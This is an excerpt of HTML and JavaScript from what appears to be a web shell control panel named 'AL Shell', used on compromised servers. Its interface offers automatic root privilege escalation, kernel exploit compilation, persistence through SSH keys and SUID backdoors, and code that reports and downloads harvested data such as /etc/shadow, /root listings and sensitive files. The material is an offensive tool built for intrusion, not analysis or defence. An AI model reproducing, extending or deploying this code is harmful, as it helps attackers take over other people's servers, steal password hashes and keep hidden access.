    ...
    <div class="modal-content" style="max-width: 900px; width: 90vw; max-height: 85vh;">
        ...
        <div style="padding: 10px 15px;">
            ...
            <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
                ...
                <button id="downloadRootDataBtn" onclick="downloadRootData()" style="flex:1;min-width:100px;background:#08f;color:#fff;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;opacity:0.5;" disabled title="Available after root obtained">📥 Root Data</button>
            ...
            <div style="background:#1a1a00;border:1px solid #ff0;padding:8px;margin-bottom:10px;border-radius:4px;">
                ...
                <p style="color:#ccc;margin:3px 0 0 0;font-size:9px;line-height:1.4;">
                    <strong>🔥 GET ROOT (AUTO)</strong> = Scan & auto-try ALL vectors + auto-collect data<br>
                    <strong>🐛 Kernel Auto-Compile</strong> = Manual kernel exploit (if AUTO fails)<br>
                    <strong>🔒 Persist</strong> = Install AFTER root (SSH keys, backups)<br>
                    <strong>📥 Root Data</strong> = Download auto-collected root data (after success)
                </p>
            </div>
...
// 🎯 DOWNLOAD AUTO-COLLECTED ROOT DATA
function downloadRootData() {
    if (!window.lastCollectedRootData) {
        alert('No root data available. Run GET ROOT (AUTO) first.');
        return;
    }
    
    const data = window.lastCollectedRootData;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const hostname = data.identity?.hostname || 'unknown';
    
    let content = '=== ROOT DATA COLLECTION ===\n';
    content += 'Timestamp: ' + (data.identity?.timestamp || new Date().toISOString()) + '\n';
    content += 'Hostname: ' + hostname + '\n';
    content += 'Generated by: AL Shell Auto-Collect\n';
    content += '========================================\n\n';
    ...
    a.href = url;
    a.download = 'root_data_' + hostname + '_' + timestamp + '.txt';
    ...
    const outputDiv = document.getElementById('privescOutput');
    if (outputDiv) {
        outputDiv.innerHTML += '<span style="color:#0f0;">📥 Downloaded root_data_' + hostname + '_' + timestamp + '.txt</span>\n';
        outputDiv.scrollTop = outputDiv.scrollHeight;
    }
}
...
<span style="color:#888;">   Root only exists during exploit execution.</span>
`;

    // 🎯 Show auto-collect info if available
    if (hasAutoCollect) {
        html += `
<span style="color:#0f0;font-weight:bold;">✅ AUTO-COLLECT COMPLETE!</span>
<span style="color:#6cf;">   Critical data was captured during exploit:</span>
<span style="color:#ccc;">   ${window.lastCollectedSummary || 'Data collected'}</span>

<span style="color:#6cf;">📁 COLLECTED CATEGORIES:</span>`;
        
        const categories = window.lastCollectedRootData;
        if (categories.identity) html += `\n<span style="color:#0f0;">   ✓ Identity (id, whoami, hostname)</span>`;
        if (categories.passwords?.etc_shadow?.includes(':')) {
            html += `\n<span style="color:#0f0;">   ✓ /etc/shadow READABLE!</span>`;
        } else if (categories.passwords) {
            html += `\n<span style="color:#ccc;">   • /etc/passwd (users)</span>`;
        }
        if (categories.root_dir?.ls_la_root && !categories.root_dir.ls_la_root.includes('Permission denied')) {
            html += `\n<span style="color:#0f0;">   ✓ /root/ directory accessible!</span>`;
        }
        if (categories.system) html += `\n<span style="color:#ccc;">   • System processes</span>`;
        if (categories.network) html += `\n<span style="color:#ccc;">   • Network info</span>`;
        if (categories.sensitive) html += `\n<span style="color:#ccc;">   • Sensitive files</span>`;
        
        html += `

<span style="color:#6cf;">💾 Data saved to:</span>
<span style="color:#ccc;">   ${(window.lastCollectedPaths || ['server']).join('\n   ')}</span>

<span style="color:#ff0;">⚠️ PERSISTENCE WARNING:</span>
<span style="color:#ccc;">   SUID backdoor likely WON'T WORK due to:</span>
<span style="color:#ccc;">   • File owned by user (not root)</span>
<span style="color:#ccc;">   • Kernel protections (nosuid, Yama LSM)</span>
<span style="color:#ccc;">   • CloudLinux LVE restrictions</span>

<span style="color:#6cf;">📋 WHAT TO DO NOW:</span>
<span style="color:#ccc;">   1. ⬆️ Click "📥 Download Root Data" button ABOVE</span>
<span style="color:#ccc;">   2. 🔒 Click "Persist" to attempt SSH key backup</span>
<span style="color:#ccc;">   3. 📁 Check Shell tab for collected files</span>`;
    } else {
        // No auto-collect data (older exploit or manual)
        html += `
<span style="color:#f44;">❌ NO AUTO-COLLECT DATA</span>
<span style="color:#ccc;">   Auto-collect may have failed or not triggered.</span>

<span style="color:#6cf;">📋 WHAT TO DO NOW:</span>
<span style="color:#ccc;">   1. 🔒 Click "Persist" button to attempt backup</span>
<span style="color:#ccc;">   2. 🐚 Try manual commands in Shell tab</span>`;
    }

    html += `

<span style="color:#888;">═══════════════════════════════════════</span>
<span style="color:#6cf;">📝 TERMINAL INPUT (may NOT have root):</span>`;
    ...
    for (const path of commonPaths) {
        try {
            ...
            if (hasRootOwner && hasSuidBit && hasFile && !notFound) {
                ...
                output.innerHTML += `\n<span style="color:#0f0;font-weight:bold;">✅ SUID BACKDOOR DETECTED (ROOT OWNED)!</span>
<span style="color:#0f0;">   Path: ${path}</span>
<span style="color:#6cf;">   This might work! Test in Shell tab:</span>
...
<span style="color:#ff0;">   ⚠️ If "Permission denied", kernel is blocking SUID</span>\n`;
